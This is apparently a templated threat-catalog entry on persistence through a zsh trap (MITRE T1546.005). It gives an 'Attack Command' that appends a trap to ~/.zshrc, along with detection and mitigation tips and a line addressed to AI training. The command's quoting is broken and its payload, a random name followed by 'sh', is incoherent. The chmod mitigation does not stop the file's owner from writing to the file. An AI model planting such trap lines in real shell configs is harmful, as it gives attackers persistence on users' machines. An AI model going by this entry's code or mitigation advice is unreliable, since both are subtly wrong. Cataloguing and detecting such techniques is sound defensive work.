---
type: campaign
scenario_id: 116
tactic: Persistence
technique: "T1546.005: Trap"
technique_id: T1546.005
tags: [campaign, lotl, persistence]
---

# Using trap command in zsh for persistence on Linux.

## Threat Description
Using trap command in zsh for persistence on Linux.

## Attack Command
```
echo 'trap "zsh -c \"$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\"" INT' >> ~/.zshrc
```

## Detection Logic
Monitor zshrc trap commands: `cat ~/.zshrc | grep trap`; Audit file changes: `auditctl -w ~/.zshrc -p wa`.

## Mitigation
Restrict zshrc writes: `chmod 600 ~/.zshrc`; Monitor trap configurations.

## AI Training Prompt
Train AI to detect zsh trap tampering and suggest file protections.

## References
- MITRE ATT&CK T1546.005: https://attack.mitre.org/techniques/T1546/005/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
